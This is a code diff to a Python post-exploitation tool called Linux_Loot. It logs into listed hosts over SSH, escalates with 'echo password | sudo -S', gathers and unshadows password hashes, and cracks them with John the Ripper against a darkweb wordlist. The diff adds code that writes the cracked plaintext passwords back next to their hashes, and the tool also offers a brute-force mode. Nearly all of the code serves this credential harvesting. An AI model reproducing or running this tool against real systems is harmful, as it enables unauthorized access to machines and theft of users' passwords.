@@ -4,12 +4,15 @@ import paramiko as paramiko
 from psycopg2 import Error
 import subprocess
 from collections import OrderedDict
+import colorama
+import pathlib
 
 
 class Linux_Loot:
     def __init__(self):
         self.targets = None
         self.opt = None
+        colorama.init(autoreset=True)
 
     # Getting arguments from command line
     @staticmethod
@@ -32,11 +35,11 @@ class Linux_Loot:
 
         try:
             ssh.connect(hostname=host, username=user, password=pas, port=port)
-            print(f"[*] Connection established")
+            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + f"[*] Connection established")
             return ssh
 
         except:
-            print(f"[!] Could not establish connection with {host}:{port}")
+            print(colorama.Fore.RED + colorama.Style.BRIGHT + f"[!] Could not establish connection with {host}:{port}")
             return False
 
     # Kill the connection
@@ -59,17 +62,12 @@ class Linux_Loot:
                 targets.append(line.rstrip().split(' '))
         return targets
 
-    def parse_result_john(self, result):
-        if result.find('No password hashes loaded') == -1:
-            user_pass = result.split('\n')[1].split()
-            print(f'\n{user_pass[1][1:-1]}:{user_pass[0]}')
-
     # Select priv escalation payload (for future modifications)
     def privesc_methods(self, pas):
         if self.opt.privesc == 'ss':
             return f' echo {pas} | sudo -S '
         else:
-            print('[*] No such privesc method')
+            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + '[*] No such privesc method')
             return 1
 
     # Write dump about single host into file
@@ -105,8 +103,12 @@ class Linux_Loot:
                 file.close()
 
     # Records the compliance of the user's hash and password
-    def password_write(self, file):
-        pass
+    def password_write(self, file, user_pass):
+        path = pathlib.Path(f'./Linux_Loot/All_hashes/{file}')
+        for user_hash in path.read_text().split():
+            username = user_hash.split(':')[0]
+            if username == user_pass.split(':')[0]:
+                path.write_text(path.read_text().replace(user_hash, f'{user_hash}:{user_pass.split(":")[1]}'))
 
     # Collect loot from single host
     def collect_loot(self, target):
@@ -138,10 +140,10 @@ class Linux_Loot:
 
             # Close connection
             self.ssh_disconnect(ssh)
-            print("[+] Success!")
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n[+] Success!")
 
         except (Exception, Error) as error:
-            print("[!] Operation failed: ", error)
+            print(colorama.Fore.RED + colorama.Style.BRIGHT + "[!] Operation failed: ", error)
 
     # Getting users and their hashes
     def unshadow(self):
@@ -163,26 +165,36 @@ class Linux_Loot:
         files = stdout.stdout
 
         for file in files.split():
-            print(f'[*] ./Linux_Loot/All_hashes/{file}')
+            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + f'[*] ./Linux_Loot/All_hashes/{file}')
             john = subprocess.Popen(['john', '--wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt',
                                      f'./Linux_Loot/All_hashes/{file}'], stdout=subprocess.PIPE, text=True)
             john.wait()
+
+            john = subprocess.Popen(['john', '--show',
+                                     f'./Linux_Loot/All_hashes/{file}'], stdout=subprocess.PIPE, text=True)
+            john.wait()
             stdout, stderr = john.communicate()
-            self.parse_result_john(stdout)
+            if stdout.find('0 password hashes cracked') == -1:
+                [self.password_write(file, user_pass) for user_pass in stdout.split('\n')[:-3]]
+                print(colorama.Fore.GREEN + '[+] Password found!')
+            else:
+                print(colorama.Fore.RED + '[-] No passwords found!')
+
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n[+] Success!")
 
     # Try to collect loot from all given hosts
     def loot_all_hosts(self):
-        print('+----------------------TARGETS-----------------------+')
+        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '+----------------------TARGETS-----------------------+')
         self.targets = self.parse_list()
         for target in self.targets:
             self.collect_loot(target)
         self.unshadow()
 
         if self.opt.brute:
-            print('+-----------------------BRUTE------------------------+')
+            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '+-----------------------BRUTE------------------------+')
             self.brute_force()
 
-        print("+----------------------------------------------------+")
+        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "+----------------------------------------------------+")
 
     def main(self):
         self.opt = Linux_Loot.get_args()
